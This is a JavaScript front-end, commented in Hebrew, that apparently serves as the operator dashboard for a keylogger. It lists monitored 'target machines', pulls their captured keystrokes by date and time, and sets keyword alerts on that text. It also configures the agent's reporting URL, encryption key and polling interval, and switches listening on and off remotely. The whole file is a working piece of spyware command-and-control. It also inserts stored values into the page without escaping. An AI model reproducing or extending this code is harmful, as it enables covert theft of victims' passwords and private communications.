// ===== מצב ושמירה מקומית =====
const LS_KEYS = {
  alerts:  "kl_alerts",
  agent:   "kl_agent_settings",
  agentOn: "kl_agent_enabled",
};

// BASE של ה-API (ללא UI; ערך ברירת מחדל, שנה פה אם צריך)
const API_BASE = "http://127.0.0.1:5000/api";

// ===== עוזרים =====
const $  = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));
const fmtJSON  = (obj) => JSON.stringify(obj, null, 2);
const normTime = (t) => {
  if (!t) return null;
  const [h, m] = String(t).replace("%3A", ":").split(":");
  return `${String(h??"").padStart(2,"0")}:${String(m??"0").padStart(2,"0")}`;
};
const weekdayName = (dateStr) => {
  if (!dateStr) return "";
  const d = new Date(dateStr);
  return ["ראשון","שני","שלישי","רביעי","חמישי","שישי","שבת"][d.getDay()];
};

// Toast
let toastTimer = null;
function toast(msg, ok=true){
  const t = $("#toast");
  t.textContent = msg;
  t.classList.remove("hidden");
  t.style.background = ok ? "#111827" : "#991b1b";
  t.classList.add("show");
  clearTimeout(toastTimer);
  toastTimer = setTimeout(()=>{ t.classList.remove("show"); }, 1800);
}

// ===== API =====
async function apiGET(path){
  const res = await fetch(`${API_BASE}${path}`, { mode:"cors" });
  if(!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}
async function apiPOST(path, body){
  const res = await fetch(`${API_BASE}${path}`, {
    method:"POST", headers:{ "Content-Type":"application/json" },
    body: JSON.stringify(body ?? {}), mode:"cors"
  });
  if(!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

// ===== Login =====
async function login(username, password){
  try {
    const res = await apiPOST(`/login`, { username, password });
    if(res.success){
      window.location.href = "home.html"; // מעבר לדף הבית
    } else {
      toast(res.message, false);
    }
  } catch(e) {
    console.error(e);
    toast("שגיאה בשרת. נסה שוב.", false);
  }
}



const api = {
  // מחשבים/לוגים
  getMachines:   () => apiGET(`/get_target_machines_list`),
  getKeystrokes: ({machine, date, start, end}) => {
    if (!machine) throw new Error("בחר מחשב");
    const qs = new URLSearchParams({ machine });
    if (date)  qs.append("date",  date);
    if (start) qs.append("start", normTime(start));
    if (end)   qs.append("end",   normTime(end));
    return apiGET(`/get_keystrokes?${qs.toString()}`);
  },
  // התראות
  createNotification: (payload) => apiPOST(`/notifications`,        payload),
  deleteNotification: (payload) => apiPOST(`/deletenotifications`, payload),
  // הגדרות סוכן
  getSettings:   ()      => apiGET(`/get_settings`),
  updateSettings:(data)  => apiPOST(`/update_settings`, data),
};

// ===== UI: מחשבים =====
async function refreshMachines(){
  const strip = $("#machines-strip");
  const ddl   = $("#logs-machine");
  strip.innerHTML = '<span class="muted">טוען...</span>';
  $("#machines-status").textContent = "";

  try{
    const list = await api.getMachines();
    strip.innerHTML = ""; ddl.innerHTML = "";
    if (!Array.isArray(list) || list.length === 0){
      strip.innerHTML = '<span class="muted">לא נמצאו מחשבים</span>';
      $("#machines-status").textContent = "אין מחשבים זמינים בתיקיית הלוגים.";
      return;
    }
    list.forEach(name => {
      const btn = document.createElement("button");
      btn.className = "machine-chip"; btn.textContent = name;
      btn.onclick = () => {
        $$(".machine-chip").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        showPage("logs");
        $("#logs-machine").value = name;
      };
      strip.appendChild(btn);

      const opt = document.createElement("option");
      opt.value = name; opt.textContent = name;
      ddl.appendChild(opt);
    });
  }catch(e){
    console.error(e);
    strip.innerHTML = '<span class="muted">שגיאה בטעינת המחשבים</span>';
    $("#machines-status").textContent = "שגיאה בתקשורת לשרת.";
  }
}

// ===== התראות (לוקאלי + שרת) =====
function loadAlerts(){
  try{ return JSON.parse(localStorage.getItem(LS_KEYS.alerts) || "[]"); }
  catch{ return []; }
}
function saveAlerts(arr){ localStorage.setItem(LS_KEYS.alerts, JSON.stringify(arr)); }
function renderAlerts(){
  const wrap = $("#alerts-list");
  const alerts = loadAlerts();
  wrap.innerHTML = alerts.length ? "" : '<div class="muted">אין התראות. צור התראה חדשה.</div>';
  alerts.forEach(a => {
    const card = document.createElement("div");
    card.className = "alert-card";
    card.innerHTML = `
      <h3>${a.title}</h3>
      <div class="muted">מילות מפתח:</div>
      <div>${(a.keywords||[]).map(k=>`<span class="alert-chip">${k}</span>`).join(" ") || "-"}</div>
      <div style="margin-top:8px;">
        <button class="btn" data-del="${a.id}">מחק</button>
      </div>`;
    wrap.appendChild(card);
  });
  wrap.querySelectorAll("[data-del]").forEach(btn=>{
    btn.addEventListener("click", async ()=>{
      const id = btn.getAttribute("data-del");
      const next = loadAlerts().filter(x => x.id !== id);
      saveAlerts(next); renderAlerts();
      try{ await api.deleteNotification({ id }); toast("התראה נמחקה"); }
      catch(e){ console.warn(e); toast("מחיקה בשרת נכשלה", false); }
    });
  });
}
async function createAlert(title, keywordsCsv){
  const id = crypto.randomUUID();
  const keywords = (keywordsCsv||"").split(",").map(s=>s.trim()).filter(Boolean);
  const payload = { id, title, keywords, createdAt: Date.now() };
  const alerts = loadAlerts(); alerts.push(payload); saveAlerts(alerts);
  renderAlerts();
  try{ await api.createNotification(payload); toast("התראה נוצרה"); }
  catch(e){ console.warn(e); toast("יצירה בשרת נכשלה", false); }
}

// ===== Agent settings (4 מפתחות בלבד) =====
function setToggleUI(isOn){
  const btn = $("#btn-toggle-agent");
  btn.textContent = isOn ? "עצור האזנה" : "התחל האזנה";
  btn.classList.toggle("btn-toggle", isOn);
  btn.dataset.on = isOn ? "1" : "0";
}
function parseBool(v){
  if (typeof v === "boolean") return v;
  const s = String(v).toLowerCase();
  return s === "true" || s === "1" || s === "on";
}

async function renderAgent(){
  try{
    // מצופה מבק-אנד להחזיר בדיוק את המפתחות האלו
    const s = await api.getSettings();
    $("#agent-url").value      = s?.url ?? "";
    $("#agent-key").value      = s?.key_encryptor ?? "";
    $("#agent-wait-sec").value = s?.wait_time ?? "";
    setToggleUI(parseBool(s?.status_listen));
  }catch(err){
    console.warn("טעינת הגדרות נכשלה:", err);
    // אם אין שרת, פשוט ננקה UI
    $("#agent-url").value = "";
    $("#agent-key").value = "";
    $("#agent-wait-sec").value = "";
    setToggleUI(false);
  }
}

// ===== לוגים =====
function showPage(id){
  $$(".page").forEach(p => p.classList.add("hidden"));
  $(`#page-${id}`).classList.remove("hidden");
  $$(".nav-links a").forEach(a => a.classList.toggle("active", a.dataset.page === id));
}
function setWeekday(){
  const d = $("#logs-date").value;
  $("#weekday-label").textContent = d ? `יום ${weekdayName(d)}` : "";
}
async function fetchLogs(){
  $("#logs-status").textContent = "טוען...";
  $("#logs-results").innerHTML = "";

  const machine = $("#logs-machine").value;
  const date = $("#logs-date").value;
  const start = $("#logs-start").value;
  const end   = $("#logs-end").value;

  try{
    const arr = await api.getKeystrokes({ machine, date, start, end });
    if (!arr || !arr.length){
      $("#logs-status").textContent = "לא נמצאו נתונים לטווח שבחרת.";
      return;
    }
    $("#logs-status").textContent = `נמצאו ${arr.length} קבצים.`;
    arr.forEach((item, i) => {
      let obj = null;
      if (typeof item === "string"){ try{ obj = JSON.parse(item); }catch{} }
      else if (item && typeof item === "object"){ obj = item; }

      const card = document.createElement("div");
      card.className = "log-card";
      card.innerHTML = `<div class="log-title">קובץ #${i+1}</div><pre>${obj?fmtJSON(obj):String(item)}</pre>`;
      $("#logs-results").appendChild(card);
    });
  }catch(err){
    console.error(err);
    $("#logs-status").textContent = "שגיאה בשליפת נתונים מהשרת.";
  }
}

// ===== אירועים ואתחול =====
document.addEventListener("DOMContentLoaded", ()=>{

//לוגין
const loginForm = document.getElementById("loginForm");
    if(loginForm){
      loginForm.addEventListener("submit", (e)=>{
        e.preventDefault();
        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value;
        if(!username || !password) return toast("יש למלא שם משתמש וסיסמה", false);
        login(username, password);
      });
    }

  // ניווט
  $$(".nav-links a").forEach(a => {
    a.addEventListener("click", (e)=>{ e.preventDefault(); showPage(a.dataset.page); });
  });

  // מחשבים
  $("#btn-refresh-machines").addEventListener("click", refreshMachines);

  // התראות
  $("#alert-form").addEventListener("submit", async (e)=>{
    e.preventDefault();
    const title = $("#alert-title").value.trim();
    const keywords = $("#alert-keywords").value.trim();
    if (!title) return;
    await createAlert(title, keywords);
    e.target.reset();
  });

  // סוכן — ארבעה כפתורים
  $("#btn-save-url").addEventListener("click", async ()=>{
    const url = $("#agent-url").value.trim();
    try{ await api.updateSettings({ url }); toast("url נשמר"); }
    catch(e){ console.error(e); toast("שגיאה בשמירת url", false); }
  });

  $("#btn-save-key").addEventListener("click", async ()=>{
    const key_encryptor = $("#agent-key").value;
    try{ await api.updateSettings({ key_encryptor }); toast("key_encryptor נשמר"); }
    catch(e){ console.error(e); toast("שגיאה בשמירת key_encryptor", false); }
  });

  $("#btn-save-wait").addEventListener("click", async ()=>{
    const n = Number($("#agent-wait-sec").value);
    const wait_time = Number.isFinite(n) ? n : null;
    try{ await api.updateSettings({ wait_time }); toast("wait_time נשמר"); }
    catch(e){ console.error(e); toast("שגיאה בשמירת wait_time", false); }
  });

  $("#btn-toggle-agent").addEventListener("click", async ()=>{
    const isOn = $("#btn-toggle-agent").dataset.on === "1";
    const next = !isOn;
    setToggleUI(next); // עדכון UI מיידי
    try{
      await api.updateSettings({ status_listen: next });
      toast(next ? "האזנה הופעלה" : "האזנה נעצרה");
    }catch(e){
      console.error(e);
      setToggleUI(isOn); // החזרה אם נכשל
      toast("שגיאה בעדכון status_listen", false);
    }
  });

  // לוגים
  $("#logs-date").addEventListener("change", setWeekday);
  $("#btn-fetch-logs").addEventListener("click", fetchLogs);

  // init
  renderAlerts();
  renderAgent();
  const d = new Date();
  $("#logs-date").value = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
  setWeekday();
  refreshMachines();
});
